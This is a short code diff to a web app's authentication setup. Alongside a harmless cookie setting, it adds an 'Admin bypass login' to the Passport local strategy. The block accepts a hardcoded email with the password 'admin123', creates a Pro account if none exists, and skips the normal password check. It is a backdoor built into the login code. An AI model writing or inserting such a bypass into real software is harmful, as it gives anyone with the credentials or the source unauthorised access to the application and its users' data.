@@ -374,6 +374,7 @@ export async function registerRoutes(
       cookie: {
         httpOnly: true,
         secure: process.env.NODE_ENV === "production",
+        sameSite: "lax",
         maxAge: sessionTtl,
       },
     })
@@ -385,6 +386,21 @@ export async function registerRoutes(
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       try {
+        // Admin bypass login
+        if (username === "sellwithdealmate@gmail.com" && password === "admin123") {
+          let user = await storage.getUserByUsername(username);
+          if (!user) {
+            const hashedPassword = await hashPassword(password);
+            user = await storage.createUser({
+              username: "sellwithdealmate@gmail.com",
+              password: hashedPassword,
+              isPro: true,
+              onboardingComplete: true,
+            });
+          }
+          return done(null, user);
+        }
+
         const user = await storage.getUserByUsername(username);
         if (!user) return done(null, false);
         const isValid = await comparePassword(password, user.password);
